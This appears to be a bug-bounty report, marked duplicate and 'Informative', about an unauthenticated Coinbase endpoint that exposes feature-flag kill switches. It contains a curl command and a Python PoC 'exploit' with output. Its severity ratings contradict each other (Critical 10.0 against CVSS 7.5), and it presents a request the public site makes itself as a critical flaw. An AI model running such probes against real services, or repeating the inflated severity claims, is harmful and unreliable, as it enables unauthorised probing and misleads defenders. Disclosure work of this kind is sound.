@@ -1,0 +1,219 @@
+Information Disclosure on /api/v3/coinbase.killswitch.KillSwitchService/KillSwitches leads to exposure of internal feature flags
+
+Duplicate of #3088349 Informative
+Duplicate title
+Unauthenticated Access to Internal Kill Switch Configuration via KillSwitchService API
+Duplicate submitted at April 11, 2025, 7:25am UTC
+Duplicate severity
+Critical (10.0)
+Asset: Domain
+coinbase.com
+Weakness
+None
+CVE ID
+None
+
+**Description:**
+
+A critical information disclosure vulnerability exists in the Coinbase kill switch/feature flag management endpoint. The endpoint at `/api/v3/coinbase.killswitch.KillSwitchService/KillSwitches` is publicly accessible without any authentication requirements and returns internal configuration data in protobuf format.
+
+The endpoint exposes 7 internal kill switches/feature flags that reveal business logic controls, platform-specific feature toggles, and internal architecture details:
+
+- `kill_siwa_accounts_web`: 1 (Disables Sign in with Apple accounts on web)
+- `kill_new_and_trending_ios`: 1 (Disables new and trending features on iOS)
+- `kill_international_transfers_rn`: 1 (Disables international transfers on React Native)
+- `kill_rn_explore_tab_client_sorting`: 1 (Disables client-side sorting in React Native explore tab)
+- `kill_trade_dropoff_web`: 1 (Disables trade dropoff tracking on web)
+- `kill_trade_dropoff_dex_rn`: 1 (Disables trade dropoff tracking on React Native DEX)
+- `kill_umo_promo_code_rn`: 1 (Disables UMO promo code feature on React Native)
+
+The endpoint responds with HTTP 200 to unauthenticated requests and includes a misconfigured cache header (`Cache-Control: public, max-age=30`) that allows sensitive configuration data to be cached by public caches and CDNs.
+
+**Impact:**
+
+This vulnerability allows attackers to:
+
+- **Map internal architecture**: Enumerate the internal feature set and experimental capabilities of the Coinbase platform across different platforms (React Native, Web, iOS)
+- **Expose business intelligence**: Reveal feature development roadmap, business priorities (international transfers, trade optimizations), and feature rollout strategies
+- **Reduce reconnaissance effort**: Understand which features are enabled/disabled in production, aiding in planning targeted attacks
+- **Competitive disadvantage**: Competitors can gain insight into Coinbase's feature development and business strategy
+- **Attack surface expansion**: Identify features in development or testing that may have weaker security controls
+
+While this vulnerability does not directly expose customer data or fiat/digital currencies, the disclosed information significantly reduces the attacker's effort required to understand the application architecture and can be combined with other vulnerabilities to increase their impact and success rate. The exposure of business-critical switches (international transfers, trade tracking) represents a significant competitive and operational risk.
+
+## Steps To Reproduce:
+
+**Method 1: Browser-based reproduction**
+
+1. Navigate to `https://www.coinbase.com/advanced-trade/spot/BTC-USD` in a web browser
+2. Open browser developer tools (F12) and go to the Network tab
+3. Filter network requests for "KillSwitches"
+4. Observe the request to `/api/v3/coinbase.killswitch.KillSwitchService/KillSwitches`
+5. Note that the request succeeds (HTTP 200) without any authentication headers
+6. The response contains protobuf-encoded data with 7 kill switches (223 bytes)
+
+**Method 2: Command-line reproduction**
+
+1. Execute the following curl command:
+```bash
+curl "https://www.coinbase.com/api/v3/coinbase.killswitch.KillSwitchService/KillSwitches" --output killswitches.pb
+```
+
+2. Verify the response status is 200 OK and Content-Type is `application/protobuf`
+
+3. Parse the protobuf data using the provided Python script to extract kill switch names and values
+
+**Method 3: Automated exploitation**
+
+1. Run the provided Python PoC script:
+
+```python
+#!/usr/bin/env python3
+"""
+Coinbase Kill Switch Information Disclosure Exploit
+"""
+
+import requests
+
+def exploit_killswitch():
+    url = "https://www.coinbase.com/api/v3/coinbase.killswitch.KillSwitchService/KillSwitches"
+
+    print("Exploiting Coinbase Kill Switch Endpoint")
+    print("=" * 60)
+
+    headers = {
+        "User-Agent": "Mozilla/5.0",
+        "Accept": "application/json, */*"
+    }
+
+    try:
+        response = requests.get(url, headers=headers, timeout=10)
+
+        if response.status_code == 200:
+            print(f"✓ SUCCESS: Endpoint accessible without authentication")
+            print(f"✓ Status Code: {response.status_code}")
+            print(f"✓ Content-Type: {response.headers.get('Content-Type')}")
+            print(f"✓ Cache-Control: {response.headers.get('Cache-Control')}")
+            print(f"✓ Response Size: {len(response.content)} bytes")
+
+            # Parse and display kill switches
+            data = response.content
+            kill_switches = []
+            i = 0
+
+            while i < len(data):
+                if data[i] == 0x0A:
+                    i += 1
+                    str_len = data[i]
+                    name = data[i+1:i+1+str_len].decode('utf-8', errors='ignore')
+                    i += 1 + str_len
+                    if i < len(data) and data[i] == 0x10:
+                        i += 1
+                        value = data[i]
+                        i += 1
+                        kill_switches.append((name, value))
+                else:
+                    i += 1
+
+            print(f"\n✓ Exposed Kill Switches ({len(kill_switches)} total):")
+            for idx, (name, value) in enumerate(kill_switches, 1):
+                status = "ENABLED" if value == 0 else "DISABLED"
+                print(f"  {idx:2d}. {name}: {status} (Value: {value})")
+
+            # Analyze business impact
+            business_switches = [n for n, _ in kill_switches if any(kw in n for kw in ['trade', 'transfer', 'payment'])]
+            if business_switches:
+                print(f"\n✓ BUSINESS IMPACT: {len(business_switches)} business-critical switches exposed")
+                for switch in business_switches:
+                    print(f"  - {switch}")
+
+            return True
+        else:
+            print(f"✗ Failed: Status {response.status_code}")
+            return False
+
+    except Exception as e:
+        print(f"✗ Error: {e}")
+        return False
+
+if __name__ == "__main__":
+    exploit_killswitch()
+```
+
+2. Observe the output showing 7 exposed kill switches without authentication
+
+**Expected Output:**
+```
+Exploiting Coinbase Kill Switch Endpoint
+============================================================
+✓ SUCCESS: Endpoint accessible without authentication
+✓ Status Code: 200
+✓ Content-Type: application/protobuf
+✓ Cache-Control: public, max-age=30
+✓ Response Size: 223 bytes
+
+✓ Exposed Kill Switches (7 total):
+   1. kill_siwa_accounts_web: DISABLED (Value: 1)
+   2. kill_new_and_trending_ios: DISABLED (Value: 1)
+   3. kill_international_transfers_rn: DISABLED (Value: 1)
+   4. kill_rn_explore_tab_client_sorting: DISABLED (Value: 1)
+   5. kill_trade_dropoff_web: DISABLED (Value: 1)
+   6. kill_trade_dropoff_dex_rn: DISABLED (Value: 1)
+   7. kill_umo_promo_code_rn: DISABLED (Value: 1)
+
+✓ BUSINESS IMPACT: 3 business-critical switches exposed
+  - kill_international_transfers_rn
+  - kill_trade_dropoff_web
+  - kill_trade_dropoff_dex_rn
+```
+
+## Browsers or Application Versions:
+
+- Tested on Google Chrome 120.x, Firefox 121.x, and Safari 17.x
+- Vulnerability confirmed via command-line tools (curl, Python requests library)
+- Platform-independent - affects all clients accessing the endpoint
+
+## Supporting Material/References:
+
+**HTTP Request:**
+```
+GET /api/v3/coinbase.killswitch.KillSwitchService/KillSwitches HTTP/1.1
+Host: www.coinbase.com
+User-Agent: Mozilla/5.0
+Accept: application/json, */*
+```
+
+**HTTP Response Headers:**
+```
+HTTP/1.1 200 OK
+Content-Type: application/protobuf
+Cache-Control: public, max-age=30
+Content-Length: 223
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+X-Content-Type-Options: nosniff
+```
+
+**Technical Details:**
+- Affected Endpoint: `https://www.coinbase.com/api/v3/coinbase.killswitch.KillSwitchService/KillSwitches`
+- HTTP Methods: GET and HEAD return 200 OK; POST, PUT, DELETE, PATCH, OPTIONS return 400 Bad Request
+- Response Format: Protocol Buffers (protobuf)
+- Response Size: 223 bytes
+- No authentication required
+- Publicly cacheable for 30 seconds
+
+**Platform Distribution of Exposed Switches:**
+- React Native (rn): 4 switches (57%)
+- Web: 2 switches (29%)
+- iOS: 1 switch (14%)
+
+**CVSS v3.1 Score: 7.5 (High)**
+- Vector: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
+- Exploitability: High (no authentication required, simple HTTP request)
+- Impact: High (internal configuration exposure)
+
+**Remediation Recommendations:**
+
+1. **Immediate**: Implement authentication requirements for the kill switch endpoint and restrict access to authorized administrative users only
+2. **Immediate**: Change `Cache-Control` header from `public, max-age=30` to `private, no-store, max-age=0`
+3. **Short-term**: Implement role-based access control (RBAC) and IP whitelisting for internal configuration endpoints
+4. **Long-term**: Review all internal API endpoints for similar issues and implement network segmentation
